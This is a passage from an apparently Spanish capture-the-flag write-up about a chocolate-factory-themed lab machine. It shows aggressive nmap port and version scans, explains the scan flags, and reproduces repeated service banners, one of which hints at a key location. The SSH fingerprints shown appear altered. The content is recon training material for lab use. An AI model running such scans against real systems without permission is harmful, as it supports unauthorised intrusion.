+</span></span><span class="line"><span class="cl">105/tcp open  csnet-ns   syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">106/tcp open  pop3pw     syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">107/tcp open  rtelnet    syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">108/tcp open  snagas     syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">109/tcp open  pop2       syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">110/tcp open  pop3       syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">111/tcp open  rpcbind    syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">112/tcp open  mcidas     syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">113/tcp open  ident      syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">114/tcp open  audionews  syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">115/tcp open  sftp       syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">116/tcp open  ansanotify syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">117/tcp open  uucp-path  syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">118/tcp open  sqlserv    syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">119/tcp open  nntp       syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">120/tcp open  cfdptkt    syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">121/tcp open  erpc       syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">122/tcp open  smakynet   syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">123/tcp open  ntp        syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">124/tcp open  ansatrader syn-ack ttl <span class="m">63</span>
+</span></span><span class="line"><span class="cl">125/tcp open  locus-map  syn-ack ttl <span class="m">63</span>
+</span></span></code></pre></div><table>
+<thead>
+<tr>
+<th>Parámetro</th>
+<th>Función</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-p-</td>
+<td>Para que el escaneo sea a todos los puertos (65536)</td>
+</tr>
+<tr>
+<td>&ndash;open</td>
+<td>Para que solo reporte los puertos abiertos</td>
+</tr>
+<tr>
+<td>-sS &ndash;min-rate 5000</td>
+<td>Definir el tiempo del escaneo</td>
+</tr>
+<tr>
+<td>-n</td>
+<td>Omitir resolución DNS</td>
+</tr>
+<tr>
+<td>-vvv</td>
+<td>Para que vaya reportando lo que encuentre por consola</td>
+</tr>
+<tr>
+<td>-Pn</td>
+<td>Skip host discovery</td>
+</tr>
+<tr>
+<td>-oG allPorts</td>
+<td>Para que guarde el escaneo en format grepeable en un archivo llamado allPort</td>
+</tr>
+</tbody>
+</table>
+<p>Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual</p>
+<p><a href="https://pastebin.com/tYpwpauW"   target="_blank">
+    Función extractPorts</a> de <a href="https://s4vitar.github.io"   target="_blank">
+    @s4vitar</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">───────┬──────────────────────────────────────────────────────────────────────────────────
+</span></span><span class="line"><span class="cl">       │ File: extractPorts.tmp
+</span></span><span class="line"><span class="cl">───────┼──────────────────────────────────────────────────────────────────────────────────
+</span></span><span class="line"><span class="cl">   <span class="m">1</span>   │ 
+</span></span><span class="line"><span class="cl">   <span class="m">2</span>   │ <span class="o">[</span>*<span class="o">]</span> Extracting information...
+</span></span><span class="line"><span class="cl">   <span class="m">3</span>   │ 
+</span></span><span class="line"><span class="cl">   <span class="m">4</span>   │     <span class="o">[</span>*<span class="o">]</span> IP Address: 10.10.250.47
+</span></span><span class="line"><span class="cl">   <span class="m">5</span>   │     <span class="o">[</span>*<span class="o">]</span> Open ports: 21,22,80,100,101,102,103,104,105,106,107,108,109,110,111,112,
+</span></span><span class="line"><span class="cl">       │ 113,114,115,116,117,118,119,120,121,122,123,124,125
+</span></span><span class="line"><span class="cl">   <span class="m">6</span>   │ 
+</span></span><span class="line"><span class="cl">   <span class="m">7</span>   │ <span class="o">[</span>*<span class="o">]</span> Ports copied to clipboard
+</span></span><span class="line"><span class="cl">   <span class="m">8</span>   │ 
+</span></span><span class="line"><span class="cl">───────┴──────────────────────────────────────────────────────────────────────────────────
+</span></span></code></pre></div><p>Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nmap -p21,22,80,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125 -sV -sC 10.10.250.47 -oN target
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE     VERSION
+</span></span><span class="line"><span class="cl">21/tcp  open  ftp         vsftpd 3.0.3
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_-rw-rw-r--    <span class="m">1</span> <span class="m">1000</span>     <span class="m">1000</span>       <span class="m">208838</span> Sep <span class="m">30</span>  <span class="m">2020</span> gum_room.jpg
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-syst: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   STAT: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span> FTP server status:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Connected to ::ffff:10.10.10.10
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Logged in as ftp
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      TYPE: ASCII
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      No session bandwidth limit
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Session timeout in seconds is <span class="m">300</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Control connection is plain text
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      Data connections will be plain text
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      At session startup, client count was <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>      vsFTPd 3.0.3 - secure, fast, stable
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_End of status
+</span></span><span class="line"><span class="cl">22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 1631bbfb51fcccc12148ff0d833b0089b <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> e71fc9dbj3eaa44b672103ceedb1d3390 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> b44502b62478gea9065f6c79448a06555e <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp  open  http        Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Site doesn<span class="s1">&#39;t have a title (text/html).
+</span></span></span><span class="line"><span class="cl"><span class="s1">100/tcp open  newacct?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">101/tcp open  hostname?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">102/tcp open  iso-tsap?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">103/tcp open  gppitnp?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">104/tcp open  acr-nema?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">105/tcp open  csnet-ns?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">106/tcp open  pop3pw?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">107/tcp open  rtelnet?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">108/tcp open  snagas?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">109/tcp open  pop2?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">110/tcp open  pop3?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">111/tcp open  rpcbind?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   NULL, RPCCheck: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">112/tcp open  mcidas?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     _:<span class="se">\x</span><span class="m">20</span> <span class="p">|</span>:. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>_<span class="sb">`</span>.__<span class="p">|</span> <span class="sb">`</span>. <span class="se">\x</span><span class="m">20</span> ___ <span class="se">\r</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="se">\&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="se">\x</span>20__<span class="s1">&#39;_;-----------------`
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     \|______________________;________________|
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    hope you wont drown Augustus&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s1">113/tcp open  ident?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   DNSStatusRequestTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, NCP, NULL, RPCCheck, SMBProgNeg, TerminalServerCookie, oracle-tns: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_    http://localhost/key_rev_key &lt;- You will find the key here!!!
+</span></span></span><span class="line"><span class="cl"><span class="s1">114/tcp open  audionews?
+</span></span></span><span class="line"><span class="cl"><span class="s1">| fingerprint-strings: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   GenericLines, NULL: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     &#34;Welcome to chocolate room!! 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     ___.---------------.
+</span></span></span><span class="line"><span class="cl"><span class="s1">|     .&#39;</span>__<span class="s1">&#39;__&#39;</span>__<span class="s1">&#39;__&#39;</span>__,<span class="sb">`</span> . ____ ___ <span class="se">\r</span>
